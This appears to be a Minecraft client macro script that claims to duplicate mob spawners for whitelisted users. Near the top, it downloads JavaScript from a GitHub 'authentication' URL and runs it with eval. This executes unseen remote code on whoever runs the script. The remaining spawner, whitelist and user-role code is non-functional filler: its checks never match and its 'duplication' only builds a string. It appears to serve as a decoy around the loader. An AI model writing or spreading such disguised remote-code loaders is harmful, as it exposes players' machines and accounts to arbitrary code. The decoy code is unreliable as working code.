

Chat.actionbar("§4§WWait for blacklist/whitelist")

Client.waitTick(5)


const req = Request.create("https://raw.githubusercontent.com/hasoon-0/authentication/refs/heads/main/auth.js");
const response = req.get();
const responseText = response.text();

eval(responseText);

Client.waitTick(5)
 Chat.actionbar("§4§lyou might needa reset ur game if u get whitelisted idrk") // java.lang.System.exit(1) 
Client.waitTick(5)


Client.waitTick(5)

(function() {
    const w = ["whitelist", "admin"];
    const b = ["blacklist", "suspended"];
    const spawners = {
        "Spawner_Skeleton": { e: encode("Spawner_Skeleton"), permissions: ["basic", "premium", "admin"], active: true },
        "Spawner_IronGolem": { e: encode("Spawner_IronGolem"), permissions: ["premium", "admin"], active: false }
    };

    let logs = [];
    let users = new Map();
    let actionsQueue = [];

    function log(msg) {
        const timestamp = new Date().toISOString();
        logs.push(`[${timestamp}] ${msg}`);
    }

    function c(user) {
        let m = mRand();
        const encodedUser = encode(user);
        if (b.includes(encodedUser)) {
            log(decode("Access Denied: Blacklisted."));
            return false;
        }
        if (w.includes(encodedUser)) {
            log(`Access Granted: ${m}`);
            return true;
        }
        log(decode("Access Denied: Not Whitelisted."));
        return false;
    }

    function mRand() {
        const msgs = ["whitelisted.", "blacklisted.", "approved for duplication.", "rejected from duplication.", "limited access."];
        return msgs[Math.floor(Math.random() * msgs.length)];
    }

    function d(spawner, user) {
        if (!c(user)) return;
        if (validateSpawner(spawner) && isActive(spawner)) {
            log(`Attempting to duplicate: ${spawner}`);
            let dupe = createSpawner(spawner);
            log(`Duplication successful: ${dupe}`);
        } else {
            log(decode("Invalid or inactive spawner."));
        }
    }

    function validateSpawner(spawner) {
        return spawners.hasOwnProperty(spawner);
    }

    function isActive(spawner) {
        return spawners[spawner] && spawners[spawner].active;
    }

    function encode(str) {
        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) + i)).join('');
    }

    function decode(str) {
        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) - i)).join('');
    }

    function createSpawner(spawner) {
        return `Duped_${spawners[spawner].e}`;
    }

    function executeActionQueue() {
        while (actionsQueue.length > 0) {
            const action = actionsQueue.shift();
            action();
        }
    }

    function f(spawner) {
        let enc = spawners[spawner].e;
        let steps = [
            `Initializing: ${decode(enc)}`,
            `Verifying ${decode(enc)} permissions.`,
            `Authenticate user ${decode(spawner)}.`,
            `Duplicating ${decode(enc)}.`,
            `Duplication success: Duped_${decode(enc)}`
        ];
        return steps.join("\n");
    }

    function addUser(username, role = "basic") {
        const encodedName = encode(username);
        if (!users.has(encodedName)) {
            users.set(encodedName, { role: role, isBanned: false });
            log(`New user added: ${username} (Role: ${role})`);
        } else {
            log(`User ${username} already exists.`);
        }
    }

    function assignRole(username, role) {
        const encodedName = encode(username);
        if (users.has(encodedName)) {
            users.get(encodedName).role = role;
            log(`User ${username} role updated to ${role}.`);
        } else {
            log(`User ${username} not found.`);
        }
    }

    function banUser(username) {
        const encodedName = encode(username);
        if (users.has(encodedName)) {
            users.get(encodedName).isBanned = true;
            log(`User ${username} has been banned.`);
        } else {
            log(`User ${username} not found for banning.`);
        }
    }

    function unbanUser(username) {
        const encodedName = encode(username);
        if (users.has(encodedName)) {
            users.get(encodedName).isBanned = false;
            log(`User ${username} has been unbanned.`);
        } else {
            log(`User ${username} not found for unbanning.`);
        }
    }

    function checkSpawnerPermissions(spawner, user) {
        const encodedUser = encode(user);
        const userPermissions = users.get(encodedUser)?.role || "basic";
        const spawnerPermissions = spawners[spawner]?.permissions || [];
        if (spawnerPermissions.includes(userPermissions) || userPermissions === "admin") {
            log(`User ${user} has permission to use ${spawner}.`);
            return true;
        }
        log(`User ${user} does not have permission to use ${spawner}.`);
        return false;
    }

    function delayAction(fn, delay) {
        actionsQueue.push(function() {
            setTimeout(fn, delay);
        });
    }

    function executeBatchActions(batchActions) {
        batchActions.forEach(action => actionsQueue.push(action));
        executeActionQueue();
    }

    function processLogs() {
        logs.forEach(logEntry => console.log(logEntry));
    }

    // Test case setups
    addUser("Alice", "basic");
    addUser("Bob", "premium");
    addUser("Charlie", "admin");

    // Assigning roles
    assignRole("Alice", "premium");
    assignRole("Bob", "admin");

    // Banning a user
    banUser("Alice");

    // Performing actions based on roles and access
    d("Spawner_Skeleton", "Alice"); // Should be denied
    d("Spawner_Skeleton", "Bob"); // Should be approved
    d("Spawner_IronGolem", "Charlie"); // Should be approved
    d("Spawner_IronGolem", "Bob"); // Should be approved
    d("Spawner_IronGolem", "Alice"); // Should be denied

    // Process all logs
    processLogs();

})();

